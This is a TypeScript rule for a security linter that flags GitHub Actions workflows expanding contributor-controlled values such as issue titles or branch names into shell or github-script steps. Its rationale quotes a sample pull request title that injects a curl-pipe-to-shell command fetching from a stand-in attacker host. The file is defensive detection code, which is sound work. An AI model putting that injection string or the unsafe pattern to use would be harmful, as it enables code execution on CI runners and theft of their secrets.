import { defineRule, type RuleFinding } from '@ngbastion/plugin-api';
import { PRIVILEGED_TRIGGERS, UNTRUSTED_CONTEXT, expressions, get, workflows, type YScalar } from '../shared/workflows.js';

export const ngb094 = defineRule({
  meta: {
    id: 'NGB094',
    name: 'Untrusted expression in a workflow script',
    category: 'supply-chain',
    defaultSeverity: 'high',
    cwe: ['CWE-78', 'CWE-94'],
    docs: {
      description:
        'Reports `${{ … }}` expressions that expand contributor-controlled GitHub context values — issue / pull request / discussion titles and bodies, comment and review bodies, branch names (`github.head_ref`, `pull_request.head.ref`), commit messages and author fields — directly inside `run:` scripts or the `script:` input of `actions/github-script`.',
      rationale:
        'Expressions are substituted into the script text before the shell or Node.js runs it. A pull request titled `"; curl https://evil.example/x | sh; #` therefore becomes part of the command line, executing arbitrary code on the runner with the job\'s secrets and token. Passing the value through an environment variable makes it data: the shell expands `"$TITLE"` without parsing it as code.',
      patterns: [
        '`run: echo "${{ github.event.issue.title }}"` and multi-line `run: |` scripts',
        '`uses: actions/github-script` with `script: … ${{ github.event.comment.body }} …`',
        'Contexts: `github.event.issue.title|body`, `pull_request.title|body|head.ref|head.label|head.repo.default_branch`, `comment|review|review_comment|discussion_comment.body`, `discussion.title|body`, `pages.*.page_name`, `commits.*.message|author.email|author.name`, `head_commit.message|author.*`, `workflow_run.head_branch|display_title|head_commit.*|pull_requests.*.head.ref`, `github.head_ref`',
        'High severity for privileged triggers (`pull_request_target`, `issue_comment`, `issues`, `workflow_run`, …); medium when the workflow only runs on `pull_request` / `push` (fork PRs then get a read-only token and no secrets)',
      ],
      limitations: [
        'Values copied into step outputs or `env` and later expanded with `${{ steps.x.outputs.y }}` / `${{ env.X }}` are not traced.',
        '`workflow_dispatch` inputs are not treated as untrusted (only users with write access can dispatch).',
        'Composite actions and reusable workflows are not followed.',
      ],
      falsePositives: [
        'Expressions wrapped in a function that cannot produce shell syntax (e.g. `${{ github.event.issue.title != \'\' }}`) are still reported; move them to `env:` anyway.',
      ],
      remediation:
        'Never expand untrusted contexts inside scripts. Map them to environment variables (`env: TITLE: ${{ github.event.issue.title }}`) and reference the variable with shell quoting (`"$TITLE"`) or `process.env.TITLE` in github-script.',
      example: {
        unsafe: `- run: echo "Triage \${{ github.event.issue.title }}"`,
        safe: `- env:
    TITLE: \${{ github.event.issue.title }}
  run: echo "Triage $TITLE"`,
      },
      references: [
        { title: 'GitHub Docs — Understanding the risk of script injections', url: 'https://docs.github.com/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections' },
        { title: 'GitHub Security Lab — Untrusted input in GitHub workflows', url: 'https://securitylab.github.com/resources/github-actions-untrusted-input/' },
      ],
    },
  },
  analyze(ctx) {
    const findings: RuleFinding[] = [];
    for (const w of workflows(ctx)) {
      const privileged = w.triggers.some((t) => PRIVILEGED_TRIGGERS.includes(t));
      for (const job of w.jobs) {
        for (const s of job.steps) {
          const scripts: { node: YScalar; what: string }[] = [];
          if (s.run) scripts.push({ node: s.run, what: 'run: script' });
          const script = s.uses && /^actions\/github-script@/i.test(s.uses) ? get(s.with, 'script') : undefined;
          if (script?.kind === 'scalar') scripts.push({ node: script, what: 'actions/github-script script' });
          for (const sc of scripts) {
            for (const e of expressions(w, sc.node)) {
              const m = UNTRUSTED_CONTEXT.exec(e.expr);
              if (!m) continue;
              findings.push({
                location: w.loc(e.index, e.expr.length + 5),
                message: `Job '${job.id}': ${m[0]} is expanded into a ${sc.what}; a crafted value runs as code on the runner. Pass it through env: instead.`,
                confidence: 'high',
                severity: privileged ? 'high' : 'medium',
                evidenceKind: 'pattern',
                evidence: [`${w.rel}: \${{ ${e.expr} }}`, `triggers: ${w.triggers.join(', ') || '(none)'}`],
              });
            }
          }
        }
      }
    }
    return findings;
  },
});
